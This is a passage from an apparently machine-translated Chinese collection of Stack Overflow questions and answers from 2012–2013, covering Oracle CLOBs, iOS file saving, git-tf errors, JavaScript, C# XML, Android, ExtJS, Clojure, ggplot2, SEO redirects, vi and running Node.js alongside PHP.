> 赞同：4
> 
> 时间：2013-03-06T00:44:14.423

我知道已经晚了……但这可能会对你有所帮助。

[登录](https://developers.facebook.com/docs/technical-guides/login/)部分必须在客户端（WebForm、MVC、桌面、移动等）中完成......客户端将打开一个网络浏览器（它可以集成到您的应用程序中）允许用户登录并授予正确的权限你的应用程序。

Facebook 将返回一个[AccessToken](https://developers.facebook.com/docs/concepts/login/access-tokens-and-types/)给你，它只在有限的时间内有效，但你可以请求一个[Extention](https://developers.facebook.com/docs/howtos/login/extending-tokens/)。

由于您要创建 Web 服务，因此您的服务必须从客户端接收 AccessToken，然后您可以做任何您想做的事情。（包括扩展它）

仅供参考：[这篇文章](https://stackoverflow.com/questions/3936813/is-it-possible-to-create-a-desktop-app-using-facebook-oauth-2-0-authentication-w)讨论了尝试在没有浏览器的情况下使用 oauth。

[FB登录文档](https://developers.facebook.com/docs/technical-guides/login/)

希望它有所帮助，丹尼尔。

# oracle - PLSQL：如何将 clob 发送到远程数据库

> ID：13353360
> 
> 赞同：2
> 
> 时间：2012-11-12T23:30:35.860
> 
> 标签：oracle, batch-file, plsql, clob, remote-server

情况是：我想在DB1本地导出表到XML文件，然后在远程数据库DB2上导入这个xml。我已经有了导出和导入的程序，但是如何将数据发送到远程服务器？

我想先写一个批处理文件在本地导出，它可以生成一个xml文件或返回一个clob字符串。然后将数据导入远程数据库服务器。

我怎么能那样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T10:32:53.613

根据关于[AskTom 的讨论](http://asktom.oracle.com/pls/apex/f?p=100:11:0%3a%3a%3a%3aP11_QUESTION_ID:52297289480186)，您似乎无法通过数据库链接获取 CLOB。

但是，有许多 LOB 操作在 DBLink 上工作。例如，您可以通过数据库链接*选择*LOB。

在您的情况下，您可以在 DB1 中创建一个包含您的 CLOB 的全局临时表，然后直接在 DB2 中导入这个 clob。

在 DB1 中，您将拥有：

*   临时表`GTT (temp_data XMLFile) -- or CLOB`
*   提取`proc`/过滤您的 XMLFile 并插入临时表的过程`GTT`

在 DB2 中：

*   一个数据库链接`DBL1`到 DB1
*   你会打电话`proc@DBL1`，
*   然后`INSERT INTO dest_table (dest_col) (SELECT temp_data FROM gtt@DBL1)`

# iphone - iPhone：尝试保存二进制文件

> ID：13353368
> 
> 赞同：0
> 
> 时间：2012-11-12T23:31:45.647
> 
> 标签：iphone

我有一个数组定义为短 FavList[300];

我尝试在其中加载所有 1，保存它。然后全0并加载它。

在我读入 w 数据后，它仍然是 0.s，并且没有加载所有的数据。

代码

```
-(void)Load{

    // put in all 1's
    for(int i=0; i<AMOUNT_OF_IMAGES; i++)
        FavList[i]=1;  

    // save it
    [self Save];

    // put in all 0's
    for(int i=0; i<AMOUNT_OF_IMAGES; i++)
        FavList[i]=0; 

    // load it
    NSString *path = [NSString stringWithFormat:@"%@/test3.bin", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0]];
    NSData *read = [NSData dataWithContentsOfFile:path];
    if (read==nil)
    {
        // it has not been save whete, set up a empty favret
        for(int i=0; i<AMOUNT_OF_IMAGES; i++)
            FavList[i]=0;     
    }
    else
    {
    // transfer to our arrow
     NSRange test = {0,sizeof(FavList)};
    [read getBytes:&FavList range:test];

    // what happen, the data is still 0, not 1?????????
   }

} 

-(void)Save{
    // get file name
    NSString *path = [NSString stringWithFormat:@"%@/test3.bin", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0]];

    NSMutableData *data = [NSMutableData dataWithLength:sizeof(FavList)];
    [data appendBytes:&FavList length:sizeof(FavList)];
    [data writeToFile:path atomically:YES];     

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T18:14:12.453

我使用 [data appendBytes:&FavList length:sizeof(FavList)]; 添加数据。追加在最后添加了数据。它是用 FavList 的大小创建的，因此请求全为零，最后存储的数据。

当数据被读取时，它是乞讨，只是零

# git - Git-tf 命令在线程“main”java.lang.UnsatisfiedLinkError 中抛出异常

> ID：13353369
> 
> 赞同：1
> 
> 时间：2012-11-12T23:31:52.403
> 
> 标签：git, tfs, git-tf

在最近升级到山狮后，我注意到所有 git tf 命令，例如`git tf checkin`抛出以下期望：

```
Exception in thread "main" java.lang.UnsatisfiedLinkError: com.microsoft.tfs.jni.internal.console.NativeConsole.nativeEnableEcho()Z
at com.microsoft.tfs.jni.internal.console.NativeConsole.nativeEnableEcho(Native Method)
at com.microsoft.tfs.jni.internal.console.NativeConsole.enableEcho(NativeConsole.java:56)
at com.microsoft.tfs.jni.ConsoleUtils.enableEcho(ConsoleUtils.java:47)
at com.microsoft.gittf.client.clc.commands.framework.Command.prompt(Command.java:464)
at com.microsoft.gittf.client.clc.commands.framework.Command.promptForPassword(Command.java:436)
at com.microsoft.gittf.client.clc.commands.framework.Command.promptForCredentials(Command.java:424)
at com.microsoft.gittf.client.clc.commands.framework.Command.getDefaultCredentials(Command.java:288)
at com.microsoft.gittf.client.clc.commands.framework.Command.getCredentials(Command.java:306)
at com.microsoft.gittf.client.clc.commands.framework.Command.getConnection(Command.java:324)
at com.microsoft.gittf.client.clc.commands.framework.Command.getVersionControlClient(Command.java:474)
at com.microsoft.gittf.client.clc.commands.CheckinCommand.run(CheckinCommand.java:193)
at com.microsoft.gittf.client.clc.Main.main(Main.java:328) 
```

我已经尝试更新 git、git-tf 和 java 运行时，但我仍然看到这个错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T03:24:53.903

## 更新：2013 年 2 月 4 日

## 该项目的开发人员添加了修复此问题的更新，并为更新版本的 osx 10.7+ 添加了对 java 7 的支持，可以从此处下载更新：http: [//www.microsoft.com/en-us/download /details.aspx?id=30474](http://www.microsoft.com/en-us/download/details.aspx?id=30474)

这是 osx 10.8.2 的一个已知问题，与此版本附带的最新版本的 java 1.7.0 相关。git-tf 项目团队建议的解决方法是在执行 git-tf 命令时使用更高版本的 java 1.6.0。

# javascript - Javascript：如何获取绑定到事件的事件处理程序列表

> ID：13353373
> 
> 赞同：11
> 
> 时间：2012-11-12T23:32:15.973
> 
> 标签：javascript, javascript-events, event-handling

> **可能重复：**
> [如何在 DOM 节点上查找事件侦听器？](https://stackoverflow.com/questions/446892/how-to-find-event-listeners-on-a-dom-node)

给定一个元素，比如说 a `div`，是否可以获得绑定到该元素触发的特定事件的处理程序列表？

```
/* pseudo code: click on a div handlers? */
document.getElementById('myDiv').getHandlers('click'); 
```

**编辑**

好的，这里有更多细节。我想将点击处理程序绑定到 div，除非另一个处理程序已经绑定到 div。我想到的是以下内容：

```
/* pseudo code: click on a div handlers? */
if(!document.getElementById('myDiv').getHandlers('click'))
   document.getElementById('myDiv').addEventListener('click', myEventhandler); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-12T23:36:06.617

不，使用 DOM 方法是不可能的。

但是，一些库将它们绑定的所有处理程序存储在与元素相关的数据结构中，以启用诸如`unbindAll`.

# css - 在单页滚动网站的一个部分创建随机背景

> ID：13353376
> 
> 赞同：0
> 
> 时间：2012-11-12T23:32:27.097
> 
> 标签：css, image, background, background-image

我正在寻找代码来随机化单页滚动网站的一部分上的背景图像。我已经研究了这样做的方法（php/js/html 的东西；[一个 ex](http://css-tricks.com/snippets/php/randomize-background-image/)，[第二个 ex](http://www.thought-after.com/2006/05/css-random-background-image-rotation/)），但我无法让它们工作，因为我不希望图像应用于所有页面/部分和我不希望它出现在 HTML 的“正文”中。”请指教！

`backgound-image`目前，我使用单个类的代码更改 CSS 中的背景。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:53:18.067

这是用于随机化背景图像的 PHP 代码：

```
<?php

$bg = array('bg-01.jpg', 'bg-02.jpg', 'bg-03.jpg', 'bg-04.jpg', 'bg-05.jpg', 'bg-06.jpg', 'bg-07.jpg' ); // array of filenames

$i = rand(0, count($bg)-1); // generate random number size of the array
$selectedBg = "$bg[$i]"; // set variable equal to which random filename was chosen        
?> 
```

和：

```
<style type="text/css">
.mydiv{
    background: url(images/<?php echo $selectedBg; ?>) no-repeat;
    height:300px;
    width:300px;
}
</style>
<div class="mydiv">

</div> 
```

* * *

这是随机化背景图像的 JavaScript 和 JQuery 解决方案：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script>
var images = ['image1.jpg', 'image2.jpg', 'image3.jpg'];
$('.mydiv').css({
    'background-image': 'url(/path/to/images/' + images[Math.floor(Math.random() *      images.length)] + ')'
});
</script> 
```

看看这个实际操作（点击左上角的运行以随机化图像）：http: [//jsfiddle.net/Kf6sb/](http://jsfiddle.net/Kf6sb/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T18:15:14.747

您也可以使用 javascript/jquery 来执行此操作。与上面贾斯汀的非常相似，只是它不会由 PHP 处理，也不需要 in page css。

```
var uri = 'http://example.com';
var img_folder = '/images/';
var img_files = ['bg-01.jpg', 'bg-02.jpg', 'bg-03.jpg', 'bg-04.jpg', 'bg-05.jpg', 'bg-06.jpg', 'bg-07.jpg'];

function randomBackground()
{
   var random_image = img_files[Math.floor(Math.random()*img_files.length)];
   $('body').css({"background-image":"url("+random_image+")"});
}

//when the page loads
$(document).ready(function()
{
    randomBackground();
});

//an example of changing it on a timer at random
setInterval(function(){randomBackground();}, 300000);

//example of changing it on click
$('#someIDofSomeElement').click(function(){randomBackground();} 
```

值得一提的是，这是纯粹的概念，未经测试，但在某种程度上，如果不是这样，这应该可以工作。但是同样，这不是一成不变的方法，正如上面所展示的那样，有 PHP 的方法，或者任何语言来做到这一点，我也可能想到十几种方法来添加它，以不同的方式做，或者做它。

# c# - 通用 XML 反序列化为未定义对象

> ID：13353387
> 
> 赞同：4
> 
> 时间：2012-11-12T23:33:03.663
> 
> 标签：c#, .net, xml-parsing, xml-serialization, xml-deserialization

我有一个非常长、非常多样化的 XML 文件，我试图将其中的一部分存储到数据库中。现在，我不想通过手写 10,000 个不同的对象来存储反序列化的数据。有没有办法根据在 XML 文件中找到的内容来定义对象？

例如，如果我有：

```
<objecttype1>
    <attr1>Some string of text</attr1>
</objecttype1>
<objecttype1>
    <attr2>123456789</attr2>
</objecttype1> 
```

我希望定义一个类似于以下内容的对象：

```
public class objecttype1 {
    public string attr1 {get; set;}
    public string attr2 {get; set;}
} 
```

基本上，我想将整个 xml 文档反序列化为各种不同的对象，这些对象具有代表原始 xml 文档的某种层次结构，然后根据它们的类型从这些对象中提取数据以放入我的数据库中。有没有办法/更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T23:46:19.710

您正在寻找一个[ExpandoObject](http://msdn.microsoft.com/en-us/library/system.dynamic.expandoobject.aspx)。
ExpandoObject 是 C#4 中引入的动态对象。
示例实现在[这里](http://phejndorf.wordpress.com/2011/11/20/using-expandoobject-dynamic-with-xml-data/)找到：

```
 public static IEnumerable<dynamic> GetExpandoFromXml(string file, string descendantid)
{
    var expandoFromXml = new List<dynamic>();

    var doc = XDocument.Load(file);
    var nodes = doc.Root.Descendants(descendantid);

    foreach (var element in doc.Root.Descendants(descendantid))
    {
        dynamic expandoObject = new ExpandoObject();
        var dictionary = expandoObject as IDictionary<string, object>;
        foreach (var child in element.Descendants())
        {
            if (child.Name.Namespace == "")
                dictionary[child.Name.ToString()] = child.Value.Trim();
        }
        yield return expandoObject;
    }
} 
```

更多链接： http:
[//www.codeproject.com/Tips/227139/Converting-XML-to-an-dynamic-object-using-ExpandoO](http://www.codeproject.com/Tips/227139/Converting-XML-to-an-dynamic-object-using-ExpandoO)
[http://www.codeproject.com/Articles/461677/Creating-a-使用ExpandoOb 来自XML 的动态对象](http://www.codeproject.com/Articles/461677/Creating-a-dynamic-object-from-XML-using-ExpandoOb)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:56:21.687

简而言之，没有办法将 XML 中的类型反序列**化为 XML content 命名的具体类型**。为了能够将 xml 反序列化为给定的具体类型，您必须在代码中定义该类型。或者可能有不同的类型结构，其中定义了 TypeName（从它创建的位置，即 xml 中的标记名称）。

*对动态*对象进行反序列化的唯一好处是，您最终将拥有*某种*动态类型，其中包含所有属性。

如果要将 XML 保存到数据库中，我不会将其反序列化为动态对象。相反，我会使用 XML 文档对象模型 (XmlDocument?) 来读取然后保存到数据库中。否则，您最终将拥有具有所有字符串属性的对象，然后保存它们。似乎只是反序列化为对象的多余步骤。

此外，反序列化为动态对象（如答案所建议的那样）不会为您提供不同类型的对象（至少不会为 XML 中的那些类型提供）。

# android - Android：布局后在屏幕上获取 ListView 项目位置

> ID：13353388
> 
> 赞同：1
> 
> 时间：2012-11-12T23:33:04.483
> 
> 标签：android, listview

我目前正在研究一个功能类似于 Roman Nurik 的粘性滚动视图技术的片段：

[http://code.google.com/p/romannurik-code/source/browse/misc/scrolltricks](http://code.google.com/p/romannurik-code/source/browse/misc/scrolltricks)

但是，我想将它与 ListView 一起使用，并让它同时贴在屏幕的顶部和底部。通过在屏幕顶部和底部使用两个隐藏视图，并在正确的项目到达顶部或底部时使用以下命令取消隐藏它们，我已经取得了一定的成功：

```
//Similar to Roman's Stick ScrollView
 @Override
public void onScrollChanged() {

    if(scrollListen){
        if(mMovingClock != null && mMovingClock.getTop() <= list.getTop()){
            //Log.i("DraftSync", "View at " + String.valueOf(mMovingClock.getTop()));
            clockTop.setVisibility(View.VISIBLE);
        }else {
            clockTop.setVisibility(View.INVISIBLE);
        }

        if(mMovingClock != null && mMovingClock.getBottom() >= list.getBottom()){
            clockBottom.setVisibility(View.VISIBLE);
        }else {
            clockBottom.setVisibility(View.INVISIBLE);
        }
    }

} 
```

我遇到的问题是，如果我的目标列表项 (mMovingClock) 是片段开始时屏幕上显示的初始项之一，则 list.GetTop() 方法返回零。我进行了广泛的搜索，并了解到这是因为它在将其呈现在屏幕上的位置之前对其进行了测量，但是我在我认为应该在的位置启用了 scrollListen：

```
 @Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {

     rootView = inflater.inflate(R.layout.fragment_draft, container, false);
     list = (ObservableListView)rootView.findViewById(R.id.draft_queue);
     list.setCallbacks(this);

 ...

  list.getViewTreeObserver().addOnGlobalLayoutListener(
             new ViewTreeObserver.OnGlobalLayoutListener() {
                 @Override
                 public void onGlobalLayout() {
                     onScrollChanged();
                    scrollListen = true;

                 }
      });

    return rootView;

} 
```

我想我正确地遵循了这个例子，但是在正确测量 mMovingClock 之前，scrollListen 被设置为 true。谁能弄清楚为什么这个视图总是为 getTop() 和 getY() 返回 0 直到它滚出屏幕一次？之后一切都很好。

有什么建议吗？

谢谢，乔什

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-15T11:03:09.067

好的，我觉得错过这个很傻，但这里是：

在我的布局的 xml 中，我将 ListView 设置为 wrap_content 而不是 fill_parent。我花了很多时间查看片段编码，以至于我从未考虑过检查布局。

感谢 Flavio，他的回答似乎应该有效，但最终是不必要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T03:40:06.230

安排对 getTop() 的调用以进行下一个布局传递。这时候，你的视野就已经被测量过了。试试这个：

```
final Handler h = new Handler();
list.getViewTreeObserver().addOnGlobalLayoutListener(
new ViewTreeObserver.OnGlobalLayoutListener() {
    @Override
    public void onGlobalLayout() {
        h.post(new Runnable() {
            public void run() {
                onScrollChanged();
                scrollListen = true;
            }
        });    
    }
}); 
```

# extjs - Extjs 视图别名/xtype 未在控制器中定义

> ID：13353390
> 
> 赞同：2
> 
> 时间：2012-11-12T23:33:13.960
> 
> 标签：extjs, scope, extjs4, alias, xtype

我有一个视图，其中包含一个带有 2 个选项卡的选项卡控件。我为每个选项卡定义了一个别名，格式如下：

```
alias: 'widget.contenttab' 
```

我正在尝试访问控制器中的“contenttab”，但它说它没有定义：

```
contenttab is not defined 
```

我正在尝试在控制器的选择处理程序中设置选项卡的 html 内容：

```
Ext.define('BP.controller.Induction', {
extend: 'Ext.app.Controller',

views: [
    'induction.Binder',
    'induction.LeftPage',
    'induction.RightPage',
],

stores: [
    'Sections',
    'Categories',
    'Tasks'
],

models: [
    'Section',
    'Category',
    'Task'
],

init: function() {
    this.control({
        'grid[xtype=categorygrid]': {
            itemclick: this.onItemClick 
        }
    });
    console.log('Initialized Induction!');
},

onItemClick: function(e, d) {
    console.log(d.data.category_id);
    this.getCategoriesStore().load({params:{'id':d.data.category_id}}, {
        success: function(category) {
            console.log("Category: " + category.get('name'));
        },
        error: function(e) {
            console.log(e);
        }
    });
    contenttab.html = 'test'; // produces error

}
}); 
```

'contenttab' 在我的 RightPage 视图中。产生错误的行最终需要驻留在成功回调函数中 - 但这不会被触发（我在这里为这个问题创建了另一个问题[Extjs 存储加载成功处理程序没有被触发](https://stackoverflow.com/questions/13353236/extjs-store-load-success-handler-not-getting-fired)

任何指导表示赞赏，谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T07:07:50.570

在您的情况下，您应该使用**[ComponentQuery](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.ComponentQuery)**来接收您的选项卡实例。我想您至少会知道标签的名称，这样您就可以做到

```
var single = Ext.ComponentQuery.query('contenttab[title=YourTabName]')[0]; 
```

或者，如果您需要该类型的所有选项卡。

```
var list = Ext.ComponentQuery.query('contenttab'); 
```

结果将始终是一个数组，因此我在第一个示例中使用了数组选择器。您可以随时执行此操作以获取实例。但是，您对同一个实例执行此操作的次数越多，我越建议您将实例存储为局部变量。尤其是当你在一个循环中去它的路上。

也是控制器中的**[ref](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.app.Controller-cfg-refs)**属性，它会自动为您做一些事情。一些例子：

```
refs: [
        {
            ref: 'firstTab',
            selector: 'contenttab[title=YourTabName]'
        }
    ] 
```

这将创建一个名为`getFirstTab()`（注意 auto camel-case）的方法，它引用您的选项卡（基于提供的查询）。请注意，还有更多选项，例如`autocreate`. 我必须说，我从来没有使用过这个，但它为你包装了一些东西，这在启动时可能会很好。

To answer your last comment of the [previous question](https://stackoverflow.com/questions/13346189/extjs-add-grid-panel-to-accordion-content): Yes this is the correct way to do it.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T23:58:34.387

提供别名允许您在 Ext.widget('contenttab') 方法中使用它来创建组件的实例。但是，它不会创建全局变量“contenttab”。

它所做的另一件事是在组件管理器中的“contenttab”名称下注册一个“xtype”。这样您就可以通过 xtype 引用您的组件，如

```
...
items:[ 'contenttab' ],
.... 
```

别名文档：[http](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.Class-cfg-alias) ://docs.sencha.com/ext-js/4-1/#!/api/Ext.Class-cfg-alias 以及更多示例： [http ://docs.sencha.com/ext -js/4-1/#!/guide/application_architecture](http://docs.sencha.com/ext-js/4-1/#!/guide/application_architecture)

# class - 如何从代理中获得“类”？

> ID：13353393
> 
> 赞同：2
> 
> 时间：2012-11-12T23:33:43.460
> 
> 标签：class, clojure, proxy, gen-class

我想通过 生成一个类（不是对象）[`proxy`](http://clojuredocs.org/clojure_core/1.2.0/clojure.core/proxy)，这个类稍后会被实例化。

我发现的 Clojure 代理方法的示例似乎主要处理最常见的 java 内部类场景，即，当我们只定义一个类时，因为我们想创建它的实例。

就我而言，我想定义一个真正的类——一个可以稍后加载的类。但我想定义它而不必使用`gen-class`.

那有可能吗？还是[`gen-class`](http://clojuredocs.org/clojure_core/1.2.0/clojure.core/gen-class)有要求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T01:40:41.730

如果您定义了[Clojure 协议](http://clojure.org/protocols)，然后创建了一个实现该协议的类，那么您可以稍后创建简单类的实例。

```
 (defprotocol myProtocol
  (doStuff [this x y])
  (getA [this])
  (setA [this n]))

(deftype Foo [ ^:unsynchronized-mutable a]
  myProtocol
  (doStuff [this x y] (+ x y a))
  (getA [this] a)
  (setA [this n] (set! a n)))

(def a (Foo. 42))

user> (.getA a)
42
user> (.setA a 41)
41
user> (.getA a)
41
user> (.doStuff a 3 4)
48
user> (class a)
user.Foo 
```

创建的类位于与调用的命名空间同名的包中`deftype`

# r - 使用 ggplot2 包将图例添加到“geom_bar”

> ID：13353396
> 
> 赞同：13
> 
> 时间：2012-11-12T23:34:00.227
> 
> 标签：r, ggplot2

我是R的新手，所以请原谅我的无知。我制作了一个伪堆叠条形图，其中我使用 geom_bar 绘制了 4 组条形图。三种橡树（QUAG、QUKE、QUCH）有 4 个健康状态类别（活、死、感染和草皮死）。

我的代码如下：

* * *

```
x <- as.data.frame(list(variable=c("QUAG", "QUKE", "QUCH"), alive = c(627,208,109),  infected = c(102,27,0), dead = c(133,112,12), sod.dead=c(49,8,0)))

x.plot = ggplot(x, aes(variable, alive)) + geom_bar(fill="gray85") + 
  geom_bar(aes(variable,dead), fill="gray65") +
  geom_bar(aes(variable, infected), fill="gray38") +
  geom_bar(aes(variable, sod.dead), fill="black")+
  opts(panel.background = theme_rect(fill='gray100'))
x.plot 
```

* * *

现在我想制作一个图例，显示与树状态相关的灰色阴影，即“gray65”是“死树”等。过去一个小时我一直在尝试，但无法让它工作。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-13T03:02:14.050

我看到@Brandon Bertelsen 发布了一个很好的答案。我想添加一些代码来解决原始帖子中提到的其他细节：

1.  在您重塑数据并将健康状况映射到`fill`之后，ggplot 将自动创建图例。
2.  我建议使用`scale_fill_manual()`以获得原始帖子中提到的确切灰色。
3.  `theme_bw()`是一个方便的功能，可以让您的绘图快速获得黑白外观。
4.  因子水平/颜色的绘制顺序可以通过使用 的`levels`参数指定所需的顺序来控制`factor()`。
5.  闪避的条形图（而不是堆叠的）可能对此数据集有一些优势。

* * *

```
library(reshape2)
library(ggplot2)

x <- as.data.frame(list(variable=c("QUAG", "QUKE", "QUCH"), 
                        alive=c(627, 208, 109),  infected=c(102, 27, 0), 
                        dead=c(133, 112, 12), sod.dead=c(49, 8, 0)))

# Put data into 'long form' with melt from the reshape2 package.
dat = melt(x, id.var="variable", variable.name="status")

head(dat)
#    variable   status value
# 1      QUAG    alive   627
# 2      QUKE    alive   208
# 3      QUCH    alive   109
# 4      QUAG infected   102
# 5      QUKE infected    27
# 6      QUCH infected     0

# By manually specifying the levels in the factor, you can control
# the stacking order of the associated fill colors.
dat$status = factor(as.character(dat$status), 
                    levels=c("sod.dead", "dead", "infected", "alive"))

# Create a named character vector that relates factor levels to colors.
grays = c(alive="gray85", dead="gray65", infected="gray38", sod.dead="black")

plot_1 = ggplot(dat, aes(x=variable, y=value, fill=status)) +
         theme_bw() +
         geom_bar(position="stack") +
         scale_fill_manual(values=grays)

ggsave(plot=plot_1, filename="plot_1.png", height=5, width=5) 
```

![在此处输入图像描述](../Images/0b1982d3ec443740f9fac948fe76afca.png)

```
# You may also want to try a dodged barplot.
plot_2 = ggplot(dat, aes(x=variable, y=value, fill=status)) +
         theme_bw() +
         geom_bar(position="dodge") +
         scale_fill_manual(values=grays)

ggsave(plot=plot_2, filename="plot_2.png", height=4, width=5) 
```

![在此处输入图像描述](../Images/49f628f72b81d3ff1392742028358c5a.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T00:50:42.393

你需要重塑你的数据。

```
library(reshape)
library(ggplot2)

x <- as.data.frame(list(variable=c("QUAG", "QUKE", "QUCH"), alive = c(627,208,109),  infected = c(102,27,0), dead = c(133,112,12), sod.dead=c(49,8,0)))

x <- melt(x)
colnames(x) <- c("Type","Status","value")

ggplot(x, aes(Type, value, fill=Status)) + geom_bar(position="stack") 
```

# seo - 在 404 之前避免重定向

> ID：13353398
> 
> 赞同：0
> 
> 时间：2012-11-12T23:34:05.720
> 
> 标签：seo

当一个请求进入我的站点时没有尾部斜杠，例如，我在提供任何内容之前`/about`重定向到。`/about/`如果用户请求一个不存在的 URL，他们将在获得 404 之前收到 302 重定向。我们（非常值得信赖的）SEO 团队告诉我，这会使搜索引擎感到困惑，并且只有 404 是关键。我相信这一点，但我不完全确定我理解为什么。有人可以解释技术推理吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T08:09:57.017

您应该在没有任何重定向的情况下提供 404，就好像您正在从页面重定向它不是返回 404 的已删除页面。我将举一个可能导致问题的示例。

因此，您有一个您决定删除的页面，该页面已在 Google 中编入索引。您删除该页面，它现在 302 重定向到 404 页面。但是，由于 302 重定向是临时重定向，因此此删除的页面将保留在 Google 的结果中，因为您告诉 Google 它只是暂时移动。如果实际 url 返回一个 404 页面，该页面将随着时间的推移从 Google 的索引中退出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:10:34.940

为了完成moobot的好回答，谷歌根本不喜欢302重定向（临时重定向）；它更喜欢 301 重定向（永久重定向）。

对于 SEO，有两种好的方法可以遵循（如您所愿，每个选择都是好的）：
1）将错误的 url 或旧页面重定向到个人 404 页面
2）将错误的 url 或旧页面重定向到您网站的最相关页面

无论如何，302 重定向在 SEO 中都是不好的做法。

# vi - 编辑后如何保存 etc/paths 文件

> ID：13353399
> 
> 赞同：1
> 
> 时间：2012-11-12T23:34:11.017
> 
> 标签：vi, homebrew

我正在尝试安装 Homebrew，但我发现了修复它需要做什么，但我不知道如何保存文件。这就是我需要保存文件以使 Homebrew 工作的方式。谢谢！

```
 $ sudo vi /etc/paths
    /usr/local/bin
    /usr/local/sbin
    /usr/bin
    /bin
    /usr/sbin
    /sbin 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T23:39:12.167

完成文件编辑后：

1.  敲`Esc`键
2.  按住`Shift`键并敲击`Z`两次（即`shift-Z-Z`）

为了将来参考，这里有一个[备忘单](http://www.lagmonster.org/docs/vi.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:45:12.433

你也可以点击`esc`then `:wq`，这是一个完整的冒号进入命令模式，然后是**w**写入文件，然后**q**退出 vi。

# php - 使用 http 请求在 php 旁边使用 node.js 是否安全？

> ID：13353402
> 
> 赞同：3
> 
> 时间：2012-11-12T23:34:29.010
> 
> 标签：php, node.js, http

我正在使用 PHP 和 mySQL 数据库构建网站。该网站现在具有登录/注册功能，并且可以访问带有墙壁的个人资料。在同一个网站上，我想使用 websockets 构建一个大型聊天应用程序。此聊天应托管动态扩展的聊天室数量（可能会达到数千个）中型群组（+/- 25 人）。

我一直在考虑使用 node.js 来运行 websockets，但我只想使用 node.js 来处理传入的消息和广播。另外，我想使用 PHP 将传入的消息保存在数据库中。我想在 node.js 服务器文件中使用 http 调用来处理这个问题，如[http://docs.nodejitsu.com/articles/HTTP/clients/how-to-create-a-HTTP-request](http://docs.nodejitsu.com/articles/HTTP/clients/how-to-create-a-HTTP-request)中所述。我还想使用 http 请求来获取用户的属性（例如姓名和个人资料图片），因此这些可以显示给同一聊天室中的其他用户。我不想处理这个客户端，因为用户可以很容易地伪装成其他人。

php 网站和 node.js 服务器都在 localhost 上运行。该网站在 127.0.0.1:80 上运行，服务器在 127.0.0.1:1337 上运行。

我的问题是，这种方法可以保存吗？在 node.js 服务器上执行 http 请求以从数据库发送/接收数据是否存在任何安全风险？在 PHP 网站旁边运行 node.js 是个好主意，还是应该完全在 node.js 上构建我的网站？还有其他选择吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:52:24.020

> 这种方法安全吗？

当然。我的意思是技术上，当然。它并不比任何单独的技术更不安全。但是，它确实使您的架构更加复杂，这可能会稍微导致更多的人为错误和错误或安全问题。但这更多的是关于人类和复杂性，而不是技术本身。

> 在 node.js 服务器上执行 http 请求以从数据库发送/接收数据是否存在任何安全风险？

不，不超过任何其他后端技术。它位于网络服务器后面，运行可能访问或不访问数据库的代码并返回响应。许多生产网站都在运行 node.js，没有任何安全问题。

> 在 PHP 网站旁边运行 node.js 是个好主意，还是应该完全在 node.js 上构建我的网站？

这很难回答。我认为总体而言，一种更简单且更可维护的模式也将事物和技术保持在一个地方。但是随着应用程序的增长，实际上很常见的是删除独立的部分并以自己最好的方式实现它们。通常这与性能有很大关系，将高流量系统与低流量系统分开，就像它与技术本身的能力一样。

但这通常在您拥有多个具有不同角色的服务器时发挥作用。对于较小的项目，通常价值较小。

* * *

我不知道这是否回答了你的问题，但简而言之：它本质上并不坏。这取决于。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:43:38.887

我不认为混合 Node.js 和 PHP/Apache 有什么本质上的不安全性。就像在你的电脑上运行多个程序一样，它们有自己的空间，监听自己的端口，不直接相互对话。

但我个人会更关心服务器资源（你的 CPU 有多快？有多少 RAM？）。仅在一个平台上构建您的网站肯定会更有效。但是根据您正在构建的内容，两者都可以。

从我看到的基准来看，Node.js 比 Apache 更需要资源。但是 Node.js 对于某些应用程序也非常快。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T18:10:39.693

我在生产环境中同时运行 PHP 和 nodejs，它的安全性不亚于任何其他 CGI 后端。没有人提到的一件事是 Nginx 还不支持 WebSockets，因此如果您想同时支持 PHP 应用程序和使用 websockets 的 nodejs 应用程序，那么将 Nginx 绑定到端口 80 将不起作用。

在这里查看我的答案以获得我的解决方案：[nginx vs node-http-proxy](https://stackoverflow.com/questions/13309425/nginx-vs-node-http-proxy/13310499#13310499)

编辑：从 1.3.13 版开始，Nginx 支持网络套接字。Nginx 现在已经在我的生产堆栈的 80 端口上收回了它应有的位置。

# javascript - JavaScript中的赋值操作值

> ID：13353403
> 
> 赞同：1
> 
> 时间：2012-11-12T23:34:33.753
> 
> 标签：javascript

```
<!-- HTML -->
<div id="target"></div>

// JavaScript
function MyObject() {}

var $my_div = $('#target'),
    data;
$my_div.data('extra', (data = new MyObject())); 
```

